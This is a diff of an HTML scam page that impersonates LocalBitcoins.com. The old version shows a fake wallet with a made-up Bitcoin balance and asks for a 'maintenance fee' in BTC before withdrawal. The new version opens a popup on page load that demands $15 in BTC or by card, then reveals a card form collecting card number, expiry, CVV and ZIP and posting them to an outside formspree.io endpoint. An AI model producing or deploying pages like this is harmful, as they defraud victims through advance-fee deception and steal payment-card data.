@@ -1,203 +1,128 @@
 <!DOCTYPE html>
 <html lang="en">
- <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1" name="viewport"/>
-  <title>
-   LocalBitcoins.com Dashboard
-  </title>
-  <script src="https://cdn.tailwindcss.com">
-  </script>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
-  <link crossorigin="anonymous" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+<head>
+  <meta charset="UTF-8">
+  <title>Wallet Dues</title>
   <style>
-   body {
-      font-family: 'Inter', sans-serif;
-      background-color: #f3f0ff;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #f2f2f2;
     }
-    /* Scroll horizontal for table on small screens */
-    .table-container {
-      overflow-x: auto;
+
+    .payment-form {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      width: 300px;
+      margin: 50px auto;
+      display: none;
+    }
+
+    .payment-form h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .card-icons {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .card-icons img {
+      width: 40px;
+      margin: 0 5px;
+    }
+
+    .payment-form input {
+      width: 100%;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .flex-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .payment-button {
+      background-color: #00c6c1;
+      color: white;
+      padding: 12px;
+      border: none;
+      width: 100%;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .payment-button:hover {
+      background-color: #00a9a4;
+    }
+
+    footer {
+      text-align: center;
+      padding: 30px 0;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .text-link {
+      color: #6c4dff;
+      text-decoration: underline;
+      cursor: pointer;
     }
   </style>
- </head>
- <body class="bg-[#f3f0ff] flex flex-col min-h-screen">
-  <header class="flex justify-between items-center px-6 py-4">
-   <div class="flex items-center space-x-2">
-    <i class="fab fa-bitcoin text-yellow-500 text-3xl"></i>
-    <span class="font-black text-black text-base leading-5">
-     LocalBitcoins.com
-     <span class="text-[#6c4dff] font-semibold">
-      Wallet
-     </span>
-    </span>
-   </div>
-   <div class="text-[#6c4dff] font-semibold text-sm select-none" id="btcPrice">
-   </div>
-  </header>
-  <main class="flex-grow flex justify-center px-4 pb-10">
-   <div class="bg-white rounded-xl shadow-[0_0_20px_rgba(108,77,255,0.15)] max-w-3xl w-full p-8">
-    <h1 class="text-[#6c4dff] font-extrabold text-xl mb-4">
-     Welcome to Your Wallet
-    </h1>
-    <p class="text-black font-semibold mb-6 text-lg">
-     Wallet Balance:
-     <span class="font-normal">
-      3.3115321 BTC
-     </span>
-    </p>
-    <div class="flex flex-wrap gap-4 mb-8">
-     <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition" onclick="alert('Verification not yet available.')" type="button">
-      Verify Account
-     </button>
-     <button class="bg-[#6c4dff] text-white font-semibold rounded-md py-3 px-6 hover:bg-[#5a3ee6] transition" onclick="showPaymentPopup()" type="button">
-      Withdraw Funds
-     </button>
-     <button class="bg-gray-300 text-gray-600 font-semibold rounded-md py-3 px-6 cursor-not-allowed" disabled="" type="button">
-      Deposit Funds (Unavailable)
-     </button>
-    </div>
-    <div class="text-sm text-gray-700 bg-[#f9f8ff] rounded-md p-4 break-words">
-     <strong>
-      Wallet Address:
-     </strong>
-     <br/>
-     bc1pph7jxvya7nkdwaz8eyrmzfzsufdtfldg6hvflsn7z0gcq88np6fsfaccau
-    </div>
-    <div class="mt-10">
-     <h2 class="text-[#6c4dff] font-semibold mb-3 text-base">
-      Transaction History
-     </h2>
-     <div class="table-container rounded-md border border-gray-200 bg-white shadow-sm">
-      <table class="w-full text-sm border-collapse">
-       <thead class="bg-[#f3f0ff]">
-        <tr>
-         <th class="text-left p-3 border-b border-gray-300">
-          Date
-         </th>
-         <th class="text-left p-3 border-b border-gray-300">
-          TXID
-         </th>
-         <th class="text-left p-3 border-b border-gray-300">
-          Amount (BTC)
-         </th>
-         <th class="text-left p-3 border-b border-gray-300">
-          Status
-         </th>
-         <th class="text-left p-3 border-b border-gray-300">
-          Link
-         </th>
-        </tr>
-       </thead>
-       <tbody>
-        <tr class="hover:bg-[#f9f8ff]">
-         <td class="p-3 border-b border-gray-200">
-          2023-02-02
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          b6f699a2...e5a
-         </td>
-         <td class="p-3 border-b border-gray-200 text-green-600">
-          +0.58943870
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          Confirmed
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          <a class="text-[#6c4dff] underline" href="tx.html?txid=b0p699a66t5">
-           b0p699a2...e5a
-          </a>
-         </td>
-        </tr>
-        <tr class="hover:bg-[#f9f8ff]">
-         <td class="p-3 border-b border-gray-200">
-          2023-01-02
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          ad2b91e0...c7d
-         </td>
-         <td class="p-3 border-b border-gray-200 text-green-600">
-          +2.54729340
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          Confirmed
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          <a class="text-[#6c4dff] underline" href="tx.html?txid=b7d699a256t">
-           b7d699a2...e5a
-          </a>
-         </td>
-        </tr>
-        <tr class="hover:bg-[#f9f8ff]">
-         <td class="p-3 border-b border-gray-200">
-          2023-01-02
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          c6a9384e...a12
-         </td>
-         <td class="p-3 border-b border-gray-200 text-green-600">
-          +0.17480000
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          Confirmed
-         </td>
-         <td class="p-3 border-b border-gray-200">
-          <a class="text-[#6c4dff] underline" href="tx.html?txid=b8u699a2e5a">
-           b8u699a2...e5a
-          </a>
-         </td>
-        </tr>
-       </tbody>
-      </table>
-     </div>
-    </div>
-   </div>
-  </main>
-  <footer class="text-center py-6 text-xs text-gray-600 select-none">
-   <p>
-    <strong>
-     Contact Us:
-    </strong>
-    support@localbitcoins.com
-   </p>
-   <p>
-    <a class="underline text-[#6c4dff]" href="#">
-     Privacy Policy
-    </a>
-    |
-    <a class="underline text-[#6c4dff]" href="#">
-     Terms of Service
-    </a>
-   </p>
-   <p class="mt-2">
-    © 2025 LocalBitcoins.com. All rights reserved.
-   </p>
-  </footer>
-  <script>
-   async function fetchBTCPrice() {
-      try {
-        const res = await fetch(
-          'https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd'
-        );
-        const data = await res.json();
-        document.getElementById('btcPrice').textContent =
-          '1 BTC = $' + data.bitcoin.usd.toLocaleString();
-      } catch (err) {
-        document.getElementById('btcPrice').textContent = 'Price unavailable';
-      }
-    }
+</head>
+<body onload="showPaymentPopup()">
 
-    fetchBTCPrice();
-    setInterval(fetchBTCPrice, 30000); // refresh every 30s
+<!-- Hidden Payment Form -->
+<div id="paymentSection" class="payment-form">
+  <h2>Pay Invoice</h2>
+  <div class="card-icons">
+    <img src="https://img.icons8.com/color/48/000000/visa.png" alt="Visa" />
+    <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" alt="MasterCard" />
+    <img src="https://img.icons8.com/color/48/000000/amex.png" alt="AmEx" />
+    <img src="https://img.icons8.com/color/48/000000/discover.png" alt="Discover" />
+  </div>
+  <form action="https://formspree.io/f/mvgalkbo" method="POST">
+    <input type="number" name="amount" placeholder="Payment amount" value="15.00" readonly>
+    <input type="text" name="name" placeholder="Name on card" required>
+    <input type="text" name="cardnumber" placeholder="Card number" required>
+    <div class="flex-row">
+      <input type="text" name="expiry" placeholder="MM / YY" style="flex:1" required>
+      <input type="text" name="cvv" placeholder="Security code" style="flex:1" required>
+    </div>
+    <input type="text" name="zip" placeholder="ZIP/Postal code" required>
+    <button type="submit" class="payment-button">Pay $15.00</button>
+  </form>
+</div>
 
-    function showPaymentPopup() {
-      alert(
-        "Error:Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals. The annual wallet maintenance fee of $49.98 USD has been unpaid for the past 1 years. To regain access to withdrawals, please remit the total amount due, which is $49.98 USD (representing one year of unpaid fees), to the following Bitcoin address: bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8 . Upon receipt of payment, your withdrawal access will be promptly reinstated. We appreciate your cooperation in resolving this matter. Please contact support if you have any questions or require further assistance. \n\nNeed BTC? Visit: changelly.com/buy/btc/"
-      );
+<footer>
+  <p><strong>Contact Us:</strong> support@localbitcoins.com</p>
+  <p>
+    <a class="text-link" href="#">Privacy Policy</a> |
+    <a class="text-link" href="#">Terms of Service</a>
+  </p>
+  <p class="mt-2">© 2025 LocalBitcoins.com. All rights reserved.</p>
+</footer>
+
+<script>
+  function showPaymentPopup() {
+    const proceed = confirm(
+      "Notice: Your wallet has outstanding dues that need to be settled to restore full functionality, including withdrawals.\n\nThe wallet maintenance fee of $15.00 USD is pending.\n\nTo regain access:\n1. Pay in BTC: bc1qw2t8f3qgv54fvs0h7fkm9332pzqcqej4hnr7z8\n2. Or click OK to pay securely by card.\n\nNeed BTC? Visit: changelly.com/buy/btc/"
+    );
+
+    if (proceed) {
+      document.getElementById("paymentSection").style.display = "block";
+      window.scrollTo(0, document.getElementById("paymentSection").offsetTop);
     }
-  </script>
- </body>
+  }
+</script>
+
+</body>
 </html>
